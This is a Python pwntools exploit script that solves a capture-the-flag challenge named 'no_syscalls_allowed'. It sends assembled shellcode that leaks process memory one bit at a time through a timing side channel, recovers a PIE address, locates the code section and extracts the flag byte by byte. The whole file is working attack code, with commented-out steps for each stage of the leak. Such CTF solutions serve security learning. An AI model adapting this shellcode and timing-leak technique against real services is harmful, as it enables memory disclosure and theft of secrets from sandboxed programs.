from pwn import *

context.clear(arch='amd64')
def get_a_bit(register, reg_offset, bit, local):
    if local == 1:
        target = process('./no_syscalls_allowed')
        pid = gdb.attach(target, "\nb *main+160\n set disassembly-flavor intel\ncontinue")
    else:
        target = remote('no-syscalls-allowed.chal.uiuc.tf', 1337)
    payload = asm('mov al, BYTE PTR ds:[' + register + '+' + str(reg_offset) + '''];
    xor r11, r11;
    shr al, ''' + str(bit) +''';
    shl al, 7;
    shr al, 7;
    imul rax, 0x20000000
    loop_start:
    cmp rax, r11;
    je loop_finished;
    inc r11;
    imul ebx, 0x13;
    jmp loop_start;
    loop_finished:
    ''')
    target.sendline(payload)
    current = time.time()
    print(target.recvall())
    now = time.time()
    diff = now - current
    print(diff)
    if diff > 0.2:
        print('the bit is 1')
        return 1
    else:
        print('the bit is 0')
        return 0
    target.close()

def get_a_byte(register, reg_offset, local):
    bit_string = ''
    for i in range(8):
        bit_string = str(get_a_bit(register, reg_offset, i, local)) + bit_string
    print(bit_string)
    return int(bit_string, 2)

def start_of_code_bit(reg_offset, bit, local):
    if local == 1:
        target = process('./no_syscalls_allowed')
        pid = gdb.attach(target, "\nb *main+160\n set disassembly-flavor intel\ncontinue")
    else:
        target = remote('no-syscalls-allowed.chal.uiuc.tf', 1337)
    payload = asm('''
    mov rbx, QWORD PTR ds:[rbp+0x10];
    sub rbx, 0x98;
    sub rbx, 0x1000;
    mov al, BYTE PTR ds:[rbx+''' + str(reg_offset) + '''];
    xor r11, r11;
    shr al, ''' + str(bit) +''';
    shl al, 7;
    shr al, 7;
    imul rax, 0x20000000
    loop_start:
    cmp rax, r11;
    je loop_finished;
    inc r11;
    imul ebx, 0x13;
    jmp loop_start;
    loop_finished:
    ''')
    target.sendline(payload)
    current = time.time()
    print(target.recvall())
    now = time.time()
    diff = now - current
    print(diff)
    if diff > 0.2:
        print('the bit is 1')
        return 1
    else:
        print('the bit is 0')
        return 0
    target.close()

def start_of_code_byte(reg_offset, local):
    bit_string = ''
    for i in range(8):
        bit_string = str(start_of_code_bit(reg_offset, i, local)) + bit_string
    print(bit_string)
    return int(bit_string, 2)


#Verify leak methodology:
'''
byte = hex(get_a_byte('rip', 0, 0))
print(byte)
'''

#Search stack, manually incremented:
'''
byte = hex(get_a_byte('rbp', 0x10+5, 0))
print(byte)
'''

#Get final nibbles of PIE leak
'''
byte = hex(get_a_byte('rbp', 0x10, 0))
print('current byte is', byte)
byte = hex(get_a_byte('rbp', 0x10 + 1, 0))
print('current byte is', byte)
'''
#Verify start of code section
'''
header = ''
for i in range(4):
    byte = (start_of_code_byte(i, 0))
    header += chr(byte)
print(header)
'''
#Search for flag
'''
for i in range(0x80, 0x100, 0x10):
    test = ''
    for j in range(4):
        byte = (start_of_code_byte(i+j+0x4000, 0))
        test += chr(byte)
    print(test)
    if 'uiu' in test:
        print('SUCCESS!!!')
        print('offset at', hex(i))
        break
'''

flag = ''
for i in range(0x80, 0xb0):
    byte = (start_of_code_byte(0x4000+i, 0))
    print('current byte is', hex(byte))
    flag += chr(byte)
    print(flag)
    if byte == 0:
        print(i)
        break
print(flag)
